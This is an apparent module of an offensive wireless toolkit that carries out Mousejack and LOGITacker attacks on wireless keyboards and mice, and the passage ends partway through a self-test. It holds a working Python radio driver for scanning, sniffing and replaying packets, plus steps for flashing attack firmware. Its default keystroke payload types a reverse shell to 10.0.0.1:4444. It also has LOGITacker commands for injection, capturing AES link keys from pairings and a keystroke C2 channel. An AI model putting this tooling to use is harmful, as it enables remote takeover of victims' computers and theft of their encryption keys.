#!/usr/bin/env bash
# 12_hid_injection.sh — 2.4GHz proprietary HID (Mousejack / LOGITacker)
# Hardware: Crazyradio PA (1915:0102 stock, 1915:7777 research) or
#           nRF52840 dongle (1915:520f DFU, 1915:521f LOGITacker)
# ── self-locate WIFISTING_ROOT ──
# When launched via pkexec, HOME is /root and any $HOME-relative path
# would land in the wrong place. Resolve WIFISTING_ROOT from this
# script's own path so state / loot / captures always end up in the
# project tree regardless of who runs us.
if [[ -z "${WIFISTING_ROOT:-}" ]]; then
    _sl_src="${BASH_SOURCE[0]}"
    while [ -L "$_sl_src" ]; do
        _sl_dir="$(cd -P "$(dirname "$_sl_src")" && pwd)"
        _sl_tgt="$(readlink "$_sl_src")"
        [[ "$_sl_tgt" != /* ]] && _sl_tgt="$_sl_dir/$_sl_tgt"
        _sl_src="$_sl_tgt"
    done
    WIFISTING_ROOT="$(cd -P "$(dirname "$_sl_src")/.." && pwd)"
    export WIFISTING_ROOT
    unset _sl_src _sl_dir _sl_tgt
fi

# Under pkexec, HOME=/root even though we're writing to the invoking
# user's tree. WIFISTING_ROOT is <real_home>/wifisting, so its parent
# is the real home. Reset HOME so downstream $HOME-relative defaults
# (LOOT_DIR, CAPTURES_DIR, LOGS_DIR, XDG_CONFIG_HOME, etc.) resolve
# to the user's paths instead of /root.
if [[ -n "${WIFISTING_ROOT:-}" ]]; then
    _real_home="$(dirname "$WIFISTING_ROOT")"
    if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
        export HOME="$_real_home"
    fi
    unset _real_home
fi

: "${WIFISTING_HOME:=$WIFISTING_ROOT}"

: "${TMP_DIR:=/tmp/wifisting}"
: "${LOOT_DIR:=$HOME/wifisting/loot}"
: "${CAPTURES_DIR:=$HOME/wifisting/captures}"
: "${LOGS_DIR:=$HOME/wifisting/logs}"
: "${WIFISTING_HOME:=$HOME/wifisting}"
: "${WIFISTING_ROOT:=$HOME/wifisting}"
mkdir -p "$TMP_DIR" "$LOOT_DIR" "$CAPTURES_DIR" "$LOGS_DIR" 2>/dev/null

HID_LOOT="$LOOT_DIR/hid_injection"
HID_STATE="$TMP_DIR/hid_state"
HID_PAYLOADS="$HID_LOOT/payloads"
HID_EXT="$WIFISTING_ROOT/external"
NRF_RESEARCH_DIR="$HID_EXT/nrf-research-firmware"
LOGITACKER_DIR="$HID_EXT/logitacker"
NRF_PY2_VENV="$HID_EXT/nrf-py2-venv"
MOD_TMP="$TMP_DIR/hid_injection"
mkdir -p "$HID_LOOT" "$HID_PAYLOADS" "$HID_EXT" "$MOD_TMP"

# ═══════════════════════════════════════════════════════════════════
#  detection
# ═══════════════════════════════════════════════════════════════════

hid_detect_dongle() {
    command -v lsusb >/dev/null 2>&1 || { echo "none"; return; }
    if lsusb 2>/dev/null | grep -qi "1915:7777"; then
        echo "crazyradio_research"; return
    fi
    if lsusb 2>/dev/null | grep -qi "1915:0102"; then
        echo "crazyradio_stock"; return
    fi
    if lsusb 2>/dev/null | grep -qi "1915:521f"; then
        echo "logitacker"; return
    fi
    if lsusb 2>/dev/null | grep -qi "1915:520f"; then
        echo "nrf52840_blank"; return
    fi
    echo "none"
}

hid_logitacker_tty() {
    for tty in /dev/ttyACM*; do
        [[ -e "$tty" ]] || continue
        local vid
        vid=$(udevadm info -a -n "$tty" 2>/dev/null | \
              grep -m1 idVendor | awk -F'"' '{print $2}')
        [[ "$vid" == "1915" ]] && { echo "$tty"; return; }
    done
    echo "/dev/ttyACM0"
}

# ═══════════════════════════════════════════════════════════════════
#  Python 2 vs Python 3 detection
# ═══════════════════════════════════════════════════════════════════

hid_has_py2() {
    command -v python2 >/dev/null 2>&1 || \
    command -v python2.7 >/dev/null 2>&1
}

hid_py2_bin() {
    command -v python2 2>/dev/null || command -v python2.7 2>/dev/null || echo ""
}

hid_has_py3_usb() {
    python3 -c 'import usb.core' 2>/dev/null
}

# ═══════════════════════════════════════════════════════════════════
#  py3 Crazyradio shim — the actual port
# ═══════════════════════════════════════════════════════════════════

hid_write_py3_shim() {
    local shim="$HID_LOOT/mj_nrf24.py"
    [[ -f "$shim" ]] && return 0

    cat > "$shim" << 'PYEOF'
#!/usr/bin/env python3
"""wifisting mousejack shim — drives Crazyradio PA directly via pyusb.
Replaces the py2 nrf-research-firmware tools for scan/sniff/replay.

Subcommands:
  scan   [--channels LIST] [--duration S]
  sniff  --address A:B:C:D:E [--channels LIST] [--duration S]
  replay --address A:B:C:D:E --hex HEXFRAME

Requires: pip install pyusb
"""
import argparse
import sys
import time

try:
    import usb.core
    import usb.util
except ImportError:
    print("ERROR\tpyusb not installed (pip install pyusb)", file=sys.stderr)
    sys.exit(3)

VID = 0x1915
PID_RESEARCH = 0x7777
PID_STOCK = 0x0102

# Crazyradio USB control transfer commands
CMD_SET_CHANNEL   = (0x40, 0x01)
CMD_SET_ADDRESS   = (0x40, 0x02)
CMD_SET_DATARATE  = (0x40, 0x03)
CMD_SEND_PACKET   = (0x40, 0x04)
CMD_SET_PROMISC   = (0x40, 0x06)
CMD_RECV_PACKET   = (0xC0, 0x09)

DEFAULT_CHANNELS = [2, 5, 8, 11, 14, 17, 20, 23, 26, 29, 32, 35, 38,
                    41, 44, 47, 50, 53, 56, 59, 62, 65, 68, 71, 74, 77, 80]


class Crazyradio:
    def __init__(self):
        self.dev = usb.core.find(idVendor=VID, idProduct=PID_RESEARCH)
        if self.dev is None:
            # try stock — some commands may still work
            self.dev = usb.core.find(idVendor=VID, idProduct=PID_STOCK)
        if self.dev is None:
            raise RuntimeError("no Crazyradio found")

        # Detach kernel driver if any
        try:
            if self.dev.is_kernel_driver_active(0):
                self.dev.detach_kernel_driver(0)
        except (NotImplementedError, usb.core.USBError):
            pass

        try:
            self.dev.set_configuration()
        except usb.core.USBError:
            pass

    def set_channel(self, ch):
        self.dev.ctrl_transfer(*CMD_SET_CHANNEL, ch, 0, 0, timeout=1000)

    def set_address(self, addr_bytes, width=5):
        # NR24 addresses are LSB-first
        rev = bytes(reversed(addr_bytes[:width]))
        self.dev.ctrl_transfer(*CMD_SET_ADDRESS, width, 0, rev, timeout=1000)

    def set_data_rate(self, rate):
        # 0=250k, 1=1M, 2=2M
        self.dev.ctrl_transfer(*CMD_SET_DATARATE, rate, 0, 0, timeout=1000)

    def set_promiscuous(self, on):
        self.dev.ctrl_transfer(*CMD_SET_PROMISC, int(bool(on)), 0, 0,
                               timeout=1000)

    def send(self, payload):
        if len(payload) > 32:
            raise ValueError("payload > 32 bytes")
        self.dev.ctrl_transfer(*CMD_SEND_PACKET, 0, 0, payload, timeout=1000)

    def recv(self):
        try:
            data = self.dev.ctrl_transfer(*CMD_RECV_PACKET, 0, 0, 32,
                                          timeout=500)
            return bytes(data)
        except usb.core.USBError:
            return None


def parse_channels(s):
    if not s:
        return DEFAULT_CHANNELS
    out = []
    for part in s.split(","):
        part = part.strip()
        if "-" in part:
            a, b = part.split("-", 1)
            out.extend(range(int(a), int(b) + 1))
        else:
            out.append(int(part))
    return out


def parse_address(s):
    if not s:
        raise ValueError("address required")
    parts = s.split(":")
    if len(parts) not in (4, 5):
        raise ValueError("address must be 4 or 5 bytes")
    return bytes(int(p, 16) for p in parts)


def cmd_scan(args):
    radio = Crazyradio()
    radio.set_data_rate(2)
    radio.set_promiscuous(True)

    channels = parse_channels(args.channels)
    duration = args.duration
    start = time.time()
    idx = 0
    hits = 0

    print(f"INFO\tscanning {len(channels)} channels for {duration}s", flush=True)

    try:
        while time.time() - start < duration:
            ch = channels[idx % len(channels)]
            radio.set_channel(ch)
            time.sleep(0.02)
            radio.set_promiscuous(True)

            deadline = time.time() + 0.05
            while time.time() < deadline:
                pkt = radio.recv()
                if pkt and any(pkt):
                    hits += 1
                    hex_str = pkt.hex()
                    print(f"PACKET\t{ch}\t{int(time.time()*1000)}\t{hex_str}",
                          flush=True)
            idx += 1
    except KeyboardInterrupt:
        pass

    print(f"TOTAL\t{hits}", flush=True)
    return 0


def cmd_sniff(args):
    radio = Crazyradio()
    radio.set_data_rate(2)
    addr = parse_address(args.address)
    radio.set_address(addr, len(addr))
    radio.set_promiscuous(False)

    channels = parse_channels(args.channels)
    duration = args.duration
    start = time.time()
    idx = 0
    hits = 0

    print(f"INFO\tsniffing {args.address} for {duration}s", flush=True)

    try:
        while time.time() - start < duration:
            ch = channels[idx % len(channels)]
            radio.set_channel(ch)
            time.sleep(0.05)

            deadline = time.time() + 0.15
            while time.time() < deadline:
                pkt = radio.recv()
                if pkt and any(pkt):
                    hits += 1
                    hex_str = pkt.hex()
                    print(f"SNIFF\t{ch}\t{int(time.time()*1000)}\t{hex_str}",
                          flush=True)
            idx += 1
    except KeyboardInterrupt:
        pass

    print(f"TOTAL\t{hits}", flush=True)
    return 0


def cmd_replay(args):
    radio = Crazyradio()
    radio.set_data_rate(2)
    addr = parse_address(args.address)
    radio.set_address(addr, len(addr))
    radio.set_promiscuous(False)

    frame = bytes.fromhex(args.hexframe)
    channel = args.channel
    radio.set_channel(channel)

    for i in range(args.count):
        radio.send(frame)
        time.sleep(args.interval)

    print(f"SENT\t{args.count}\tchannel={channel}", flush=True)
    return 0


def main():
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_scan = sub.add_parser("scan")
    p_scan.add_argument("--channels")
    p_scan.add_argument("--duration", type=int, default=30)
    p_scan.set_defaults(fn=cmd_scan)

    p_sniff = sub.add_parser("sniff")
    p_sniff.add_argument("--address", required=True)
    p_sniff.add_argument("--channels")
    p_sniff.add_argument("--duration", type=int, default=30)
    p_sniff.set_defaults(fn=cmd_sniff)

    p_replay = sub.add_parser("replay")
    p_replay.add_argument("--address", required=True)
    p_replay.add_argument("--channel", type=int, required=True)
    p_replay.add_argument("--hexframe", required=True)
    p_replay.add_argument("--count", type=int, default=1)
    p_replay.add_argument("--interval", type=float, default=0.05)
    p_replay.set_defaults(fn=cmd_replay)

    args = ap.parse_args()
    try:
        return args.fn(args)
    except Exception as e:
        print(f"ERROR\t{e}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
PYEOF
    chmod +x "$shim"
    printf 'SHIM\t%s\n' "$shim"
}

# ═══════════════════════════════════════════════════════════════════
#  firmware installation (cache-aware)
# ═══════════════════════════════════════════════════════════════════

hid_install_nrf_research() {
    command -v git >/dev/null || { err "git missing"; return 1; }

    # Cache check
    if [[ -d "$NRF_RESEARCH_DIR" && -f "$NRF_RESEARCH_DIR/tools/nrf24-scanner.py" ]]; then
        ok "nrf-research-firmware already cloned"
    else
        info "cloning nrf-research-firmware (Bastille)"
        git clone https://github.com/BastilleResearch/nrf-research-firmware.git \
            "$NRF_RESEARCH_DIR" || { err "clone failed"; return 1; }
    fi

    # Install py3 shim path if python2 isn't available
    if ! hid_has_py2; then
        info "python2 not present — installing py3 shim + pyusb"
        hid_write_py3_shim
        if ! hid_has_py3_usb; then
            info "installing pyusb for python3"
            pip3 install --user pyusb 2>&1 | tail -3 || {
                warn "pyusb install failed — try: sudo apt install python3-usb"
            }
        fi
        ok "py3 shim ready: $HID_LOOT/mj_nrf24.py"
        return 0
    fi

    # py2 path — build firmware (only if missing)
    if [[ -f "$NRF_RESEARCH_DIR/firmware/bin/crazyradio.bin" ]]; then
        ok "firmware already built"
        return 0
    fi

    info "building firmware with python2 toolchain"
    pushd "$NRF_RESEARCH_DIR" >/dev/null || return 1
    sudo apt-get install -y sdcc binutils python2 python2-dev \
        libusb-1.0-0-dev 2>&1 | tail -3

    if [[ ! -d "$NRF_PY2_VENV" ]]; then
        virtualenv -p "$(hid_py2_bin)" "$NRF_PY2_VENV" 2>/dev/null || \
            python2 -m virtualenv "$NRF_PY2_VENV" 2>/dev/null || {
                warn "could not make py2 venv — will use system py2"
            }
    fi

    if [[ -x "$NRF_PY2_VENV/bin/pip" ]]; then
        "$NRF_PY2_VENV/bin/pip" install pyusb platformio 2>&1 | tail -3
    else
        sudo python2 -m pip install pyusb platformio 2>&1 | tail -3
    fi

    make 2>&1 | tail -5
    popd >/dev/null
    ok "firmware built — flash with: cd $NRF_RESEARCH_DIR && sudo make install"
}

hid_install_logitacker() {
    command -v git >/dev/null || { err "git missing"; return 1; }

    if [[ -d "$LOGITACKER_DIR" ]]; then
        ok "LOGITacker already cloned"
    else
        info "cloning LOGITacker"
        git clone https://github.com/RoghanDawes/LOGITacker.git \
            "$LOGITACKER_DIR" || { err "clone failed"; return 1; }
    fi

    # Look for prebuilt hex first
    local hexdir="$LOGITACKER_DIR/hex"
    [[ ! -d "$hexdir" ]] && hexdir="$LOGITACKER_DIR/logitacker/hex"
    if [[ -d "$hexdir" ]]; then
        ls -la "$hexdir" 2>/dev/null | head -10
        ok "prebuilt hex available at $hexdir"
    else
        warn "no prebuilt hex — build from source per README"
    fi

    cat <<'HINT'

flash procedure (nRF52840 USB dongle):
  1. plug in, double-tap reset — RED LED pulses = bootloader
  2. install nrfutil: pip install nrfutil
  3. build DFU package:
       nrfutil pkg generate --hw-version 52 --sd-req 0x00 \
         --application logitacker.hex --application-version 1 logitacker.zip
  4. flash:
       nrfutil dfu usb-serial -pkg logitacker.zip -p /dev/ttyACM0
HINT
}

hid_deps_check() {
    local missing=()
    command -v git     >/dev/null 2>&1 || missing+=("git")
    command -v make    >/dev/null 2>&1 || missing+=("make")
    python3 -c 'import usb.core' 2>/dev/null || \
        command -v python2 >/dev/null 2>&1 || \
        missing+=("pyusb-py3")

    if (( ${#missing[@]} )); then
        printf 'MISSING\t%s\n' "$(IFS=,; echo "${missing[*]}")"
        return 1
    fi

    local py_ok="no"
    hid_has_py2 && py_ok="py2"
    hid_has_py3_usb && py_ok="${py_ok} py3"

    printf 'READY\tpython:%s\n' "$py_ok"
    lsusb 2>/dev/null | grep -i 1915 || warn "no Nordic USB device currently attached"
}

# ═══════════════════════════════════════════════════════════════════
#  mousejack scan / sniff / replay
# ═══════════════════════════════════════════════════════════════════

hid_mj_scan() {
    local dur="${1:-30}"
    local d
    d=$(hid_detect_dongle)
    [[ "$d" != "crazyradio_research" && "$d" != "crazyradio_stock" ]] && {
        printf 'ERROR\tneed Crazyradio (found: %s)\n' "$d" >&2
        return 1
    }

    local outfile="$HID_LOOT/mj_scan_$(date +%H%M%S).log"

    if hid_has_py2 && [[ -f "$NRF_RESEARCH_DIR/tools/nrf24-scanner.py" ]]; then
        info "using py2 nrf-research toolchain"
        sudo python2 "$NRF_RESEARCH_DIR/tools/nrf24-scanner.py" \
            -c $(seq 2 2 80) -l 5 2>&1 | tee "$outfile"
    else
        info "using py3 shim (mj_nrf24.py)"
        hid_write_py3_shim >/dev/null
        python3 "$HID_LOOT/mj_nrf24.py" scan --duration "$dur" | tee "$outfile"
    fi

    # Extract unique 5-byte addresses from PACKET lines
    grep -oE '\b[0-9a-f]{10}\b' "$outfile" 2>/dev/null | sort -u \
        > "$HID_STATE.addrs" || true

    local n
    n=$(wc -l < "$HID_STATE.addrs" 2>/dev/null || echo 0)
    printf 'LOG\t%s\n' "$outfile"
    printf 'ADDRS\t%s\n' "$HID_STATE.addrs"
    printf 'COUNT\t%s\n' "$n"
}

# Convention #4: a prompt must never block a GUI/pkexec/piped caller. TRUE
# only when we are on an interactive terminal and the GUI did not set
# WIFISTING_CLI. This module's own dispatch sets WIFISTING_CLI=1.
hid_can_prompt() {
    [[ -z "${WIFISTING_CLI:-}" && -t 0 ]]
}

hid_mj_sniff() {
    local addr="$1" dur="${2:-30}"
    [[ -z "$addr" ]] && {
        if [[ -f "$HID_STATE.addrs" ]]; then
            info "known addresses:"
            cat -n "$HID_STATE.addrs"
        fi
        if ! hid_can_prompt; then
            printf 'ERROR\tno target address; cannot prompt in non-interactive mode (pass ADDR)\n' >&2
            return 1
        fi
        read -rp "  target address (5 bytes, colon or hex)> " addr
    }
    [[ -z "$addr" ]] && return 1

    # Normalize: accept aa:bb:cc:dd:ee or aabbccddee
    if [[ "$addr" != *:* && ${#addr} -eq 10 ]]; then
        addr="${addr:0:2}:${addr:2:2}:${addr:4:2}:${addr:6:2}:${addr:8:2}"
    fi

    local outfile="$HID_LOOT/mj_sniff_${addr//:/}_$(date +%H%M%S).log"

    if hid_has_py2 && [[ -f "$NRF_RESEARCH_DIR/tools/nrf24-sniffer.py" ]]; then
        info "using py2 sniffer"
        sudo python2 "$NRF_RESEARCH_DIR/tools/nrf24-sniffer.py" \
            -a "$addr" -c $(seq 2 2 80) 2>&1 | tee "$outfile"
    else
        info "using py3 shim"
        hid_write_py3_shim >/dev/null
        python3 "$HID_LOOT/mj_nrf24.py" sniff \
            --address "$addr" --duration "$dur" | tee "$outfile"
    fi

    printf 'LOG\t%s\n' "$outfile"
}

hid_mj_replay() {
    local addr="$1" hex="$2" ch="${3:-6}" count="${4:-10}"
    [[ -z "$addr" || -z "$hex" ]] && {
        printf 'ERROR\tusage: --mj-replay ADDRESS HEXFRAME [CHANNEL] [COUNT]\n' >&2
        return 2
    }
    hid_write_py3_shim >/dev/null
    python3 "$HID_LOOT/mj_nrf24.py" replay \
        --address "$addr" --channel "$ch" --hexframe "$hex" \
        --count "$count"
}

# ═══════════════════════════════════════════════════════════════════
#  payload build
# ═══════════════════════════════════════════════════════════════════

hid_build_payload() {
    local name="$1"
    if [[ -z "$name" ]]; then
        if ! hid_can_prompt; then
            printf 'ERROR\tno payload name; cannot prompt in non-interactive mode (pass NAME)\n' >&2
            return 1
        fi
        read -rp "  payload name (no ext): " name
    fi
    local ducky="$HID_PAYLOADS/${name}.txt"

    if [[ ! -f "$ducky" ]]; then
        cat > "$ducky" << 'DUCK'
REM sample wifisting payload
DELAY 1500
GUI r
DELAY 500
STRING xterm
ENTER
DELAY 800
STRING bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
ENTER
DUCK
        info "template written: $ducky — edit before injecting"
        # ${EDITOR:-nano} is interactive; spawning it from the GUI would hang
        # the action forever. The payload exists either way, so skip the edit
        # and say so rather than failing the build.
        if hid_can_prompt; then
            ${EDITOR:-nano} "$ducky"
        else
            printf 'NOTE\tnon-interactive: skipping ${EDITOR:-nano}; edit %s yourself\n' \
                "$ducky" >&2
        fi
    fi

    # If py2 toolchain available, compile to bytecode
    if hid_has_py2 && [[ -f "$NRF_RESEARCH_DIR/tools/ducky.py" ]]; then
        local out="$HID_PAYLOADS/${name}.mj"
        python2 "$NRF_RESEARCH_DIR/tools/ducky.py" -i "$ducky" -o "$out" -l us
        ok "compiled payload: $out"
    else
        info "py2 toolchain missing — jackit will consume the ducky script directly"
        info "to enable compilation: install python2 + pyusb, or use jackit"
    fi
}

# ═══════════════════════════════════════════════════════════════════
#  LOGITacker — serial console with drain (fixes the write/read race)
# ═══════════════════════════════════════════════════════════════════

hid_lt_serial_drain() {
    # Drain any pending bytes from the tty so our next write is clean.
    local tty="$1"
    [[ -e "$tty" ]] || return 1
    stty -F "$tty" 57600 raw -echo 2>/dev/null || true
    timeout 0.3 cat "$tty" >/dev/null 2>&1 || true
}

hid_lt_serial_write() {
    # Write a command, wait, read response for timeout seconds.
    local tty="$1" cmd="$2" wait_s="${3:-3}"
    [[ -e "$tty" ]] || { printf 'ERROR\tno tty %s\n' "$tty" >&2; return 1; }

    hid_lt_serial_drain "$tty"

    # Write the command + newline
    printf '%s\n' "$cmd" > "$tty" 2>/dev/null || {
        printf 'ERROR\tcannot write to %s\n' "$tty" >&2
        return 1
    }

    # Read response for wait_s seconds
    timeout "$wait_s" cat "$tty" 2>/dev/null || true
}

hid_lt_console() {
    local d
    d=$(hid_detect_dongle)
    [[ "$d" != "logitacker" ]] && { err "LOGITacker not detected"; return 1; }
    local tty
    tty=$(hid_logitacker_tty)
    info "opening LOGITacker CLI on $tty (57600 baud)"
    info "screen usage: ctrl-a K Y to exit"
    sleep 1
    sudo screen "$tty" 57600
}

hid_lt_discover() {
    local d
    d=$(hid_detect_dongle)
    [[ "$d" != "logitacker" ]] && { err "LOGITacker not detected"; return 1; }
    local tty outfile
    tty=$(hid_logitacker_tty)
    outfile="$HID_LOOT/lt_discover_$(date +%H%M%S).log"

    info "LOGITacker passive discovery for 60s — Ctrl-C to abort early"

    # FIXED: drained before writing so no stale bytes appear in the log
    {
        hid_lt_serial_write "$tty" "discover onhit continue" 0.5
        hid_lt_serial_write "$tty" "discover" 60
    } | tee "$outfile"

    printf 'LOG\t%s\n' "$outfile"
}

hid_lt_pair_sniff() {
    local d
    d=$(hid_detect_dongle)
    [[ "$d" != "logitacker" ]] && { err "LOGITacker not detected"; return 1; }
    local tty outfile
    tty=$(hid_logitacker_tty)
    outfile="$HID_LOOT/lt_pair_$(date +%H%M%S).log"

    warn "pair-sniff captures the AES link key on NEW device pairings"
    warn "you must trigger a pairing on the target while this runs"

    hid_lt_serial_write "$tty" "pair-sniff" 120 | tee "$outfile"

    if grep -q "Link Key:" "$outfile" 2>/dev/null; then
        ok "link key captured — see $outfile"
    else
        warn "no link key seen — target didn't pair during the window"
    fi
    printf 'LOG\t%s\n' "$outfile"
}

hid_lt_inject() {
    # This verb takes no argv at all, so without a terminal it can only ever
    # hang on the prompts below — refuse before any device work.
    if ! hid_can_prompt; then
        printf 'ERROR\thid_lt_inject needs a target address and script name; cannot prompt in non-interactive mode\n' >&2
        return 1
    fi
    local d
    d=$(hid_detect_dongle)
    [[ "$d" != "logitacker" ]] && { err "LOGITacker not detected"; return 1; }
    local tty
    tty=$(hid_logitacker_tty)

    read -rp "  target dongle addr (from discover): " addr
    read -rp "  script name (must be stored on LOGITacker): " script

    warn "injection via LOGITacker: target=$addr script=$script"
    read -rp "  proceed? [y/N] " go
    [[ "$go" =~ ^[Yy]$ ]] || return 0

    hid_lt_serial_write "$tty" "inject target $addr" 1
    hid_lt_serial_write "$tty" "inject execute $script" 5
    ok "sent — watch the dongle LED"
}

hid_lt_covert_channel() {
    local tty
    tty=$(hid_logitacker_tty)
    info "covert channel mode — turns a compromised dongle into a keystroke C2"
    warn "requires a captured link key or an unencrypted victim"
    hid_lt_serial_write "$tty" "covert-channel start" 5
}

# ═══════════════════════════════════════════════════════════════════
#  status / info
# ═══════════════════════════════════════════════════════════════════

hid_status() {
    local d
    d=$(hid_detect_dongle)
    case "$d" in
        crazyradio_stock)     echo "Crazyradio PA (stock fw) — needs research flash" ;;
        crazyradio_research)  echo "Crazyradio PA (research fw) ready" ;;
        nrf52840_blank)       echo "nRF52840 in DFU bootloader — needs LOGITacker flash" ;;
        logitacker)           echo "LOGITacker ready on $(hid_logitacker_tty)" ;;
        none)                 echo "no supported dongle detected" ;;
    esac
}

hid_cli_status_tsv() {
    local dongle tty=""
    dongle=$(hid_detect_dongle)
    [[ "$dongle" == "logitacker" ]] && tty=$(hid_logitacker_tty)

    local py2="no" py3usb="no"
    hid_has_py2 && py2="yes"
    hid_has_py3_usb && py3usb="yes"

    printf 'dongle\t%s\n'       "$dongle"
    printf 'tty\t%s\n'          "$tty"
    printf 'state_dir\t%s\n'    "$HID_STATE"
    printf 'loot_dir\t%s\n'     "$HID_LOOT"
    printf 'python2\t%s\n'      "$py2"
    printf 'python3_usb\t%s\n'  "$py3usb"
    printf 'shim\t%s\n'         "$HID_LOOT/mj_nrf24.py"
    printf 'research_fw\t%s\n'  "$([[ -d "$NRF_RESEARCH_DIR" ]] && echo yes || echo no)"
    printf 'logitacker\t%s\n'   "$([[ -d "$LOGITACKER_DIR" ]] && echo yes || echo no)"
}

hid_cli_detect_tsv() {
    printf 'DONGLE\t%s\n' "$(hid_detect_dongle)"
}

hid_cli_check_deps() { hid_deps_check; }

hid_cli_list_payloads_tsv() {
    local f
    for f in "$HID_PAYLOADS"/*.txt "$HID_PAYLOADS"/*.mj; do
        [[ -e "$f" ]] || continue
        printf '%s\t%s\n' "$(basename "$f")" "$(stat -c%s "$f")"
    done
}

hid_cli_info() {
    cat <<'EOF'
HID injection CLI:
  --status-tsv              state + py2/py3 availability
  --detect-tsv              raw dongle type
  --check-deps              deps for py2 or py3 path
  --list-payloads-tsv       payloads folder
  --write-shim              materialize the py3 Crazyradio shim
  --mj-scan [DURATION]      promiscuous scanner
  --mj-sniff ADDR [DURATION]  sniff specific Logitech addr
  --mj-replay ADDR HEX [CH] [N]  replay a captured frame
  --install-nrf-research    clone + build Bastille toolchain (py2 or py3 shim)
  --install-logitacker      clone + hint for flashing
  --payload-name NAME       build/edit ducky payload
  --selftest                offline checks of the py3 shim parsers/framing
  --info                    this help

py2 toolchain: preferred when present. Falls back to the py3 shim for
scan/sniff/replay. Keystroke synthesis still needs py2 (jackit) or the
nRF52840 LOGITacker path.
EOF
}

# ═══════════════════════════════════════════════════════════════════
#  self-test
# ═══════════════════════════════════════════════════════════════════
# The HID/keystroke side of this module is a py2 toolchain (jackit /
# nrf-research ducky.py) or LOGITacker firmware, neither of which is
# present or testable here, so there is no DuckyScript->HID-report builder
# in this file to assert against. What IS pure logic is the py3 Crazyradio
# shim: its channel/address parsers and its control-transfer framing. The
# shim is generated from this module's own source into $MOD_TMP (never
# from the loot cache) and executed with pyusb stubbed out.
hid_selftest() {
    command -v python3 >/dev/null 2>&1 || { printf 'ERROR\tpython3 required\n' >&2; return 1; }
    local bad=0
    chk() {
        local n="$1" got="$2" want="$3"
        if [[ "$got" == "$want" ]]; then printf '%s\tPASS\n' "$n"
        else printf '%s\tFAIL want=%s got=%s\n' "$n" "$want" "$got"; bad=$((bad+1)); fi
    }

    local d out rc line nchk
    # Unique per run: a second selftest (runner alongside a manual run)
    # must not share scratch files.
    d=$(mktemp -d "$MOD_TMP/selftest.XXXXXX") || {
        printf 'ERROR\tmktemp failed under %s\n' "$MOD_TMP" >&2; return 1; }
    mkdir -p "$d/bin" "$d/payloads"

    # 1. The shim must be generated from the module source, offline.
    ( HID_LOOT="$d"; hid_write_py3_shim ) >/dev/null 2>&1
    chk shim-generated "$([[ -s "$d/mj_nrf24.py" ]] && echo yes || echo no)" "yes"

    # 2. Parser / framing checks, run against the generated shim with a
    #    stub pyusb so nothing touches USB.
    out=$(python3 - "$d/mj_nrf24.py" <<'PYEOF'
import sys, types

usb = types.ModuleType("usb")
core = types.ModuleType("usb.core")
util = types.ModuleType("usb.util")
class USBError(Exception):
    pass
core.USBError = USBError
core.find = lambda **kw: None
usb.core = core
usb.util = util
sys.modules["usb"] = usb
sys.modules["usb.core"] = core
sys.modules["usb.util"] = util

src = open(sys.argv[1]).read()
ns = {"__name__": "shim_under_test"}
exec(compile(src, sys.argv[1], "exec"), ns)

parse_channels = ns["parse_channels"]
parse_address = ns["parse_address"]
Crazyradio = ns["Crazyradio"]

bad = 0
def chk(name, got, want):
    global bad
    if got == want:
        print("%s\tPASS" % name)
    else:
        print("%s\tFAIL want=%r got=%r" % (name, want, got)); bad += 1

def rejects(name, fn, arg):
    try:
        fn(arg)
    except ValueError:
        chk(name, "ValueError", "ValueError"); return
    chk(name, "accepted", "ValueError")

# Channel plan: 27 default channels, 2..80 step 3.
chk("channels-default-len", len(parse_channels("")), 27)
chk("channels-default-first-last", (parse_channels("")[0], parse_channels("")[-1]), (2, 80))
chk("channels-range", parse_channels("2-5"), [2, 3, 4, 5])
chk("channels-mixed", parse_channels("2,5,8-9"), [2, 5, 8, 9])
rejects("channels-bad-rejected", parse_channels, "abc")

# Address parsing: 4 or 5 colon-separated hex bytes.
chk("address-5", parse_address("aa:bb:cc:dd:ee"), bytes([0xaa, 0xbb, 0xcc, 0xdd, 0xee]))
chk("address-4", parse_address("1:2:3:4"), bytes([1, 2, 3, 4]))
rejects("address-3-rejected", parse_address, "aa:bb:cc")
rejects("address-empty-rejected", parse_address, "")
rejects("address-nonhex-rejected", parse_address, "zz:bb:cc:dd:ee")

class FakeDev:
    def __init__(self):
        self.calls = []
    def ctrl_transfer(self, *a, **kw):
        self.calls.append((a, kw))
        return b"\x00" * 32

radio = object.__new__(Crazyradio)      # skip __init__: it needs a device
radio.dev = FakeDev()

try:
    radio.send(b"\x00" * 33)
    chk("send-33-rejected", "accepted", "ValueError")
except ValueError:
    chk("send-33-rejected", "ValueError", "ValueError")
radio.send(b"\x11" * 32)
chk("send-32-args", radio.dev.calls[-1][0], (0x40, 0x04, 0, 0, b"\x11" * 32))

radio.set_channel(42)
chk("set-channel-args", radio.dev.calls[-1][0][:3], (0x40, 0x01, 42))
radio.set_data_rate(2)
chk("set-datarate-args", radio.dev.calls[-1][0][:3], (0x40, 0x03, 2))
radio.set_promiscuous(True)
chk("promisc-on", radio.dev.calls[-1][0][:3], (0x40, 0x06, 1))
radio.set_promiscuous(False)
chk("promisc-off", radio.dev.calls[-1][0][:3], (0x40, 0x06, 0))

addr = bytes([0xAA, 0xBB, 0xCC, 0xDD, 0xEE])
radio.set_address(addr, 5)
chk("set-address-args", radio.dev.calls[-1][0][:4], (0x40, 0x02, 5, 0))
chk("set-address-lsb-first", radio.dev.calls[-1][0][4], bytes(reversed(addr)))

class TimeoutDev:
    def ctrl_transfer(self, *a, **kw):
        raise usb.core.USBError("timeout")

quiet = object.__new__(Crazyradio)
quiet.dev = TimeoutDev()
chk("recv-timeout-returns-none", quiet.recv(), None)

sys.exit(0 if bad == 0 else 1)
PYEOF
); rc=$?
while IFS= read -r line; do
    [[ -z "$line" ]] && continue
    printf '%s\n' "$line"
    case "$line" in *FAIL*) bad=$((bad+1)) ;; esac
done <<< "$out"
if (( rc != 0 )); then
    case "$out" in
        *$'\t'FAIL*) ;;   # already counted above
        *) printf 'shim-checks-run\tFAIL harness rc=%s\n' "$rc"; bad=$((bad+1)) ;;
    esac
fi
nchk=$(printf '%s\n' "$out" | grep -cE '	(PASS|FAIL)')
if (( nchk < 15 )); then
    printf 'shim-checks-run\tFAIL only %s checks ran\n' "$nchk"; bad=$((bad+1))
else
    printf 'shim-checks-run\tPASS (%s)\n' "$nchk"
